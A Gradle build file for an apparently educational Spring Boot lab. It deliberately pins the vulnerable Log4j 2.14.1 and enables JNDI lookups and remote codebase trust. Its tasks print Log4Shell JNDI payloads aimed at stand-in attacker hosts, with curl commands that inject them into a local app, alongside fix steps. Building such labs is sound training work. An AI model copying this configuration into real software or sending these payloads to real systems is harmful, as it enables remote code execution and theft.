plugins {
    id 'org.springframework.boot' version '2.7.18'
    id 'io.spring.dependency-management' version '1.0.15.RELEASE'
    id 'java'
    // id 'war'
}

group = 'com.example'
version = '0.0.1-SNAPSHOT'
sourceCompatibility = '17'

configurations {
    compileOnly {
        extendsFrom annotationProcessor
    }
    
    // ğŸš¨ ì·¨ì•½ì  ì‹¤ìŠµì„ ìœ„í•´ ê¸°ë³¸ ë¡œê¹… ì œì™¸í•˜ì§€ ì•ŠìŒ
    // ì‹¤ì œë¡œëŠ” spring-boot-starter-loggingì„ ì œì™¸í•´ì•¼ í•¨
}

repositories {
    mavenCentral()
}

dependencies {
    // ğŸš¨ Spring Boot Starters (ê¸°ë³¸ ë¡œê¹… ì œì™¸)
    implementation('org.springframework.boot:spring-boot-starter-web') {
        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
    }
    implementation('org.springframework.boot:spring-boot-starter-data-jpa') {
        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
    }
    implementation('org.springframework.boot:spring-boot-starter-security') {
        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
    }
    implementation('org.springframework.boot:spring-boot-starter-validation') {
        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
    }
    implementation('org.springframework.boot:spring-boot-starter-actuator') {
        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
    }
    implementation('org.springframework.boot:spring-boot-starter-thymeleaf') {
        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
    }
    
    // ğŸš¨ ì˜ë„ì ìœ¼ë¡œ ì·¨ì•½í•œ Log4j ë²„ì „ ì‚¬ìš© (êµìœ¡ ëª©ì )
    implementation 'org.apache.logging.log4j:log4j-core:2.14.1'
    implementation 'org.apache.logging.log4j:log4j-api:2.14.1'
    implementation 'org.apache.logging.log4j:log4j-slf4j-impl:2.14.1'
    implementation 'org.apache.logging.log4j:log4j-jul:2.14.1'
    implementation 'org.apache.logging.log4j:log4j-web:2.14.1'
    
    // ë°ì´í„°ë² ì´ìŠ¤
    implementation 'mysql:mysql-connector-java:8.0.33'
    runtimeOnly 'com.h2database:h2' // í…ŒìŠ¤íŠ¸ìš©
    implementation 'org.mariadb.jdbc:mariadb-java-client:3.0.8'
    
    // ìœ í‹¸ë¦¬í‹°
    compileOnly 'org.projectlombok:lombok'
    annotationProcessor 'org.projectlombok:lombok'
    
    // JWT (í–¥í›„ í™•ì¥ìš©)
    implementation 'io.jsonwebtoken:jjwt-api:0.11.5'
    implementation 'io.jsonwebtoken:jjwt-impl:0.11.5'
    implementation 'io.jsonwebtoken:jjwt-jackson:0.11.5'
    
    // ê°œë°œ ë„êµ¬
    developmentOnly 'org.springframework.boot:spring-boot-devtools'
    
    // í…ŒìŠ¤íŠ¸ (ìµœì†Œí•œë§Œ ìœ ì§€)
    testImplementation('org.springframework.boot:spring-boot-starter-test') {
        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
    }
    
    // WAR íŒ¨í‚¤ì§•ìš©
    // providedRuntime 'org.springframework.boot:spring-boot-starter-tomcat'
}

// ğŸš¨ ì·¨ì•½ì  ì‹¤ìŠµì„ ìœ„í•œ íŠ¹ë³„ ì„¤ì •
configurations.all {
    resolutionStrategy {
        // Log4j ë²„ì „ ê°•ì œ ê³ ì • (ì·¨ì•½í•œ ë²„ì „ ìœ ì§€)
        force 'org.apache.logging.log4j:log4j-core:2.14.1'
        force 'org.apache.logging.log4j:log4j-api:2.14.1'
        force 'org.apache.logging.log4j:log4j-slf4j-impl:2.14.1'
    }
    
    // ì¶©ëŒí•˜ëŠ” ë¡œê¹… êµ¬í˜„ì²´ë“¤ ì œì™¸
    exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
    exclude group: 'ch.qos.logback', module: 'logback-classic'
    exclude group: 'ch.qos.logback', module: 'logback-core'
    exclude group: 'org.apache.logging.log4j', module: 'log4j-to-slf4j'
    exclude group: 'org.slf4j', module: 'jul-to-slf4j'
}

tasks.named('test') {
    useJUnitPlatform()
    
    // í…ŒìŠ¤íŠ¸ ì‹œì—ë„ ì·¨ì•½í•œ Log4j ì‚¬ìš©
    systemProperty 'log4j2.formatMsgNoLookups', 'false'
    
    // CI í™˜ê²½ì—ì„œëŠ” í…ŒìŠ¤íŠ¸ í™œì„±í™”, ë¡œì»¬ì—ì„œëŠ” ë¹„í™œì„±í™”
    enabled = System.getenv("CI") == "true" || project.hasProperty("enableTests")
}

// WAR íŒŒì¼ ì„¤ì •
// war {
//     enabled = true
//     archiveClassifier = '' // ê¸°ë³¸ ì•„í‹°íŒ©íŠ¸ë¡œ ì„¤ì •
// }

// JAR íŒŒì¼ ì„¤ì •
jar {
    enabled = false
    archiveClassifier = ''
}

// ğŸš¨ ëŸ°íƒ€ì„ ì‹œ ì·¨ì•½ì  í™œì„±í™” ì„¤ì •
bootRun {
    // JNDI ë£©ì—… í™œì„±í™” (ì·¨ì•½ì  ì‹¤ìŠµìš©)
    systemProperty 'log4j2.formatMsgNoLookups', 'false'
    systemProperty 'com.sun.jndi.ldap.object.trustURLCodebase', 'true'
    systemProperty 'com.sun.jndi.rmi.object.trustURLCodebase', 'true'
    
    // ê°œë°œ í™˜ê²½ ì„¤ì •
    systemProperty 'spring.profiles.active', 'dev'
    
    jvmArgs = [
        '-Xmx1024m',
        '-Xms512m',
        '--add-opens', 'java.base/java.lang=ALL-UNNAMED'
    ]
}

// ğŸš¨ ì‹¤ìŠµìš© Task: ì·¨ì•½ì  í™œì„±í™” í™•ì¸
task checkVulnerability {
    doLast {
        println "âš ï¸  WARNING: This application is configured with vulnerable Log4j 2.14.1"
        println "âš ï¸  JNDI lookup is ENABLED (formatMsgNoLookups=false)"
        println "âš ï¸  This is for EDUCATIONAL PURPOSES ONLY!"
        println "âš ï¸  DO NOT use in production environment!"
        println ""
        println "ğŸ“š For learning purposes, try these attack patterns:"
        println "   \${jndi:ldap://evil.com/exploit}"
        println "   \${jndi:rmi://malicious.server/payload}"
        println "   \${jndi:dns://attacker.com/exfiltrate}"
        println ""
        println "ğŸ”§ To fix the vulnerability:"
        println "   1. Upgrade to Log4j 2.17.1 or higher"
        println "   2. Set -Dlog4j2.formatMsgNoLookups=true"
        println "   3. Block outbound LDAP/RMI connections"
    }
}

// ğŸš¨ ì‹¤ìŠµìš© Task: ê³µê²© íŒ¨í„´ í…ŒìŠ¤íŠ¸
task simulateAttack {
    doLast {
        println "ğŸ¯ Simulating Log4j attack patterns..."
        println "Use these commands to test:"
        println ""
        println "# User-Agent attack:"
        println "curl -H \"User-Agent: \\\${jndi:ldap://evil.com/exploit}\" http://localhost:8080/api/vulnerable/log-headers"
        println ""
        println "# Search parameter attack:"
        println "curl \"http://localhost:8080/api/vulnerable/analyze-search?searchTerm=\\\${jndi:ldap://attacker.com/payload}\""
        println ""
        println "# Form data attack:"
        println "curl -X POST http://localhost:8080/api/vulnerable/log-input -d \"input=\\\${jndi:rmi://malicious.com/exploit}\""
    }
}

// ë¹Œë“œ ì‹œ ê²½ê³  í‘œì‹œ
build.dependsOn checkVulnerability